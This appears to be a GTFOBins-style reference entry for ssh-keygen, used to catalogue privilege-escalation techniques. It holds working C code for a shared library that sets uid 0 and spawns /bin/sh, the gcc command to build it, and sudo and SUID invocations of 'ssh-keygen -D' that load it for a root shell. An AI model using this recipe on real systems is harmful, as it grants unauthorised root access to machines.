---
description: |
  A Shared Library is loaded by the application and executed. You can create a shared library with the following code:
  ```c
  #include <unistd.h>

  void C_GetFunctionList(){
    char *argv[] = {"/bin/sh", NULL};
    setuid(0);
    execve(argv[0], argv, NULL);
  }

  int main(int argc, char const *argv[])
  {
    return 0;
  }
  ```
  Compile it with:
  ```sh
  gcc -shared -o lib.so -fPIC lib.c
  ```
  Note: You can also define a constructor function to execute code when the library is loaded. But the `C_GetFunctionList` string needs to be present.

functions:
  library-load:
    - description: |
      code: ssh-keygen -D ./lib.so
  sudo:
    - description: |
      code: sudo ssh-keygen -D ./lib.so
  suid:
    - description: |
      code: ./ssh-keygen -D ./lib.so
---
